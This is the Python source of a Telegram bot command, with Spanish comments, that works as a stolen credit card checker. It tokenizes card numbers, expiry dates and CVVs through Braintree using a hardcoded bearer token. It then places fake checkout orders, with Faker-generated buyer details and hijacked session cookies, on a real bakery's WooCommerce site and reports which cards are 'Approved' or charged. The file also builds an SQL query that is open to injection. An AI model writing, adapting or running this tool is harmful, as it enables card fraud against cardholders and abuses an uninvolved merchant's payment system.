import json
import requests
import time
import asyncio
import re
import base64
import random
from faker import Faker
import os
import colored 
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from db import *
from user import*
from values import *

# Establece los detalles de la conexión


# Establece los detalles de la conexión
def multiexplode(delimiters, string):
    """
    Separa una cadena en elementos utilizando múltiples delimitadores.

    :param delimiters: Lista de delimitadores como cadena o lista.
    :param string: Cadena a ser dividida.
    :return: Lista de elementos separados.
    """
    if isinstance(delimiters, str):
        delimiters = [delimiters]

    # Reemplazar todos los delimitadores por el primer delimitador
    current_delimiter = delimiters[0]
    for delimiter in delimiters[1:]:
        string = string.replace(delimiter, current_delimiter)

    # Dividir la cadena utilizando el primer delimitador
    return string.split(current_delimiter)

@Client.on_message(filters.command(["ac"], ["/", "."]))
async def ch(_, message: Message):


            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("""
<i>⊗ Comando</i><i>/ac</i>
<i>⊗ Formato:</i> <code>cc|mm|yy|cvv</code>
<i>⊗ Gateway:</i><code>France</code>""")
                return

            ccs = data[1]
            card = multiexplode([":", "|", "/", " ","!"], ccs)
            cc = card[0]
            mes = card[1]
            if len(cc) != 16:
                await message.reply_text("Card Not Found. La tarjeta debe tener 16 dígitos.")
                return
            if len(mes) != 2:
                await message.reply_text("Card Not Found. mes inválido")
                return
            
            # Verificar si el año tiene 2 o 4 dígitos
            regex_pattern = r"\b\d{2}\b|\b\d{4}\b"
            match = re.search(regex_pattern, card[2])
        
            if match:
                ano = match.group()  # Obtener el año coincidente
            else:
                await message.reply_text("Formato de año no válido.")
                return
            
            cvv = card[3]
            bin_code = cc[:6]
            
            if len(cvv) != 3:
                await message.reply_text("Card Not Found. cvv inválido")
                return
            
            # Verificar si el bin está en la lista de bins prohibidos
            banned_file = "bin_banned.txt"
            if os.path.exists(banned_file):
                with open(banned_file, "r") as file:
                    banned_bins = file.read().splitlines()
                if bin_code in banned_bins:
                    await message.reply_text("Bin Banned")
                    return
            
            # Continuar con el resto del código si el bin no está en la lista de bins prohibidos
            # ...

   #dabese variable
            
            username = message.from_user.username
    
            user_id = (
        message.from_user.id
    )
         
        
           

    
    
            
                
                # Ejecuta una consulta SQL para buscar al usuario por su User ID
            query = f"SELECT status FROM users WHERE user_id='{user_id}'"
            cursor.execute(query)
                 
            # Obtiene el resultado de la consulta
            result = cursor.fetchone()
            if result is None:
             await message.reply_text( "No estás registrado. Por favor, utiliza /register para registrarte.")
             return
                # Verifica el resultado y almacena el valor en la variable "rank"
            
            rank = result[0]
            if message.from_user.id in antispam_users and antispam_users[message.from_user.id] + 16 > int(time.time()):
             time_left = antispam_users[message.from_user.id] + 16 - int(time.time())
             await message.reply_text(f"❗️ [<i>ANTISPAM DETECTADO</i>]. Espera {time_left} segundos antes de enviar otro comando.")
             return 
            else:
             antispam_users[message.from_user.id] = int(time.time())

    # ... (el resto del código existente)
    # ... (el resto del código existente)

                
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
                    
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            msg=await message.reply(f"""<b>⎚Gateway| France
Card: <code>{ccs}</code>
Progress 🔴 1.12(s)</b>""")
            
            
            
            def find_between( data, first, last ):
              try:
                start = data.index( first ) + len( first )
                end = data.index( last, start )
                return data[start:end]
              except ValueError:
                return None
            fake = Faker()
            p_nombre = fake.first_name()
            s_nombre = fake.last_name()
            Ncor = str(random.randint(111, 9999))
            Nlast4 = str(random.randint(1000, 9999))
            mail = (p_nombre+s_nombre+Ncor+'@gmail.com').lower()
            
            #############
            headers = {
              'authority': 'payments.braintree-api.com',
              'accept': '*/*',
              'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7',
              'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDAzODc2ODAsImp0aSI6IjI4OWJlMzJlLTlhODctNDhiOS04ZjY5LTNkYjdmMzg2NDg0OSIsInN1YiI6IjloNXdweHg1anA2eG0zamQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjloNXdweHg1anA2eG0zamQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319._NYSeIcJkGabzKaa8SR5ECbPWr5Xr2W5abo0KVwrcJWAn5gXoTrRMPuVHbdK2SiVhxsYUe3Oap3CkJ4crTinGw',
              'braintree-version': '2018-05-10',
              'content-type': 'application/json',
              'origin': 'https://assets.braintreegateway.com',
              'referer': 'https://assets.braintreegateway.com/',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'cross-site',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36'
              
            }
            data = {
              "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "63f17fda-0520-4aae-b04f-7bc93e03cf70"
                
              },
              "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
              "variables": {
                "input": {
                  "creditCard": {
                    "number": cc,
                    "expirationMonth": mes,
                    "expirationYear": ano,
                    "cvv": cvv
                    
                  },
                  "options": {
                    "validate": False
                    
                  }
                  
                }
                
              },
              "operationName": "TokenizeCreditCard"
              
            }
            res1 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=data)
            token = find_between(res1.text, '"token":"','"')
            msg1=await msg.edit(f"""<b>⎚Gateway | France
Card: <code>{ccs}</code>
Progress 🟠 4.40(s)</b>""")
        
            print(res1.text)
          
          
        
            headers = {
              'authority': 'healthyjoybakes.com',
              'method': 'POST',
              'accept': 'application/json, text/javascript, */*; q=0.01',
              'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8',
              'x-requested-with': 'XMLHttpRequest',
              'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
              'cookie': 'tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_ai=BsEvlPjvdCPQ52sxrUD6k6eH; __qca=P0-1049935670-1698708014818; _hjSessionUser_432740=eyJpZCI6Ijk2MzZjZWIwLTNlOWUtNWVkOC1hYWJiLTA5YTU2NDI0OWUyMCIsImNyZWF0ZWQiOjE2OTg3MDgwMTgwMDAsImV4aXN0aW5nIjp0cnVlfQ==; tk_lr=%22%22; tk_r3d=%22%22; _gid=GA1.2.997568471.1700300585; _hjIncludedInSessionSample_432740=1; _hjSession_432740=eyJpZCI6ImRmZWRlYmI2LTkxYzAtNDg2OS04OGYxLWE3YTFkMjFkZDBkNSIsImNyZWF0ZWQiOjE3MDAzMDA1ODY3MjEsImluU2FtcGxlIjp0cnVlLCJzZXNzaW9uaXplckJldGFFbmFibGVkIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; woocommerce_items_in_cart=1; wp_woocommerce_session_f5a2c2caae20f4f5cbd6bcf62bdf6a7e=t_10812b3ef0ed01271e952cf396a31d%7C%7C1700473398%7C%7C1700469798%7C%7C3fcd69c63f51af3396cd00ee82940cb5; _ga_4CX7G3JLG8=GS1.1.1700300577.14.1.1700301224.0.0.0; _ga=GA1.1.350392337.1698708004; tk_qs=; woocommerce_cart_hash=0c357559a8709273c60d13bfba507bad',
              'origin': 'https://healthyjoybakes.com',
              'referer': 'https://healthyjoybakes.com/?page_id=16',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
              
            }
            data = {
              'billing_first_name': p_nombre,
              'billing_last_name': 'muno',
              'billing_company': '',
              'billing_country': 'US',
              'billing_address_1': 'street90',
              'billing_address_2': '',
              'billing_city': 'new york',
              'billing_state': 'NY',
              'billing_postcode': '10080',
              'billing_phone': '5052217458',
              'billing_email': mail,
              'account_password': '',
              'shipping_first_name': '',
              'shipping_last_name': '',
              'shipping_company': '',
              'shipping_country': 'MX',
              'shipping_address_1': '',
              'shipping_address_2': '',
              'shipping_city': '',
              'shipping_state': '',
              'shipping_postcode': '',
              'order_comments': '',
              'payment_method': 'braintree_credit_card',
              'wc-braintree-credit-card-card-type': 'visa',
              'wc-braintree-credit-card-3d-secure-enabled': '',
              'wc-braintree-credit-card-3d-secure-verified': '',
              'wc-braintree-credit-card-3d-secure-order-total': '24.71',
              'wc_braintree_credit_card_payment_nonce': token,
              'wc_braintree_device_data': '',
              'terms': 'on',
              'terms-field': '1',
              'woocommerce-process-checkout-nonce': '6a2ba0be9d',
              '_wp_http_referer': '/?wc-ajax=update_order_review'
              
            }
            res2 = requests.post('https://healthyjoybakes.com/?wc-ajax=checkout', headers=headers, data=data)
            msg2=await msg1.edit(f"""<b>⎚Gateway | France
Card: <code>{ccs}</code>
Progress 🟢 6.20(s)</b>""")
        
            print(res2.text)
        
            if 'Insufficient funds in account, please use an alternate card or other form of payment.' in res2.text:
              status = "Approved✅"
              msg = "Insufficient funds"
            elif 'We cannot process your order with the payment information that you provided. Please use a different payment account or an alternate payment method.' in res2.text:
              status = "Declined❌"
              msg = "Card Declined"
            elif 'success' in res2.text:
              status = "Approved✅"
              msg = "CVV CHARGED $24"
            elif 'The provided card was declined, please use an alternate card or other form of payment.' in res2.text:
              status = "Declined❌"
              msg = "The provided card was declined"
            elif 'The card type is invalid or does not correlate with the credit card number.  Please try again or use an alternate card or other form of payment.' in res2.text:
              status = "Declined❌"
              msg = "The card type is invalid or does not correlate with the credit card number"
            elif 'We were unable to process your order, please try again.' in res2.text:
              status = "Declined❌"
              msg = "We were unable to process your order, please try again."
            await msg2.edit(f"""
<b> 

⊗ Card - <code>{ccs}</code> 
⊗ Status - {status}
⊗ Response - {res2.text}
⊗ GATEWAY- France 
－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {BIN} - {brand} - {typea} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {country_flag} 
－－－－－－－－－－－－－－
[ CHECK INFO ]
⌧ Proxy  - Live! ✅ 
⌧ Time Test - 7.4sec
⌧ Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> ♻️
⌧ Bot by - <b><a href="tg://resolve?domain=Sarcehkr">SarceDev[Owner]</a></b>
－－－－－－－－－－－－－－</b>
            """)

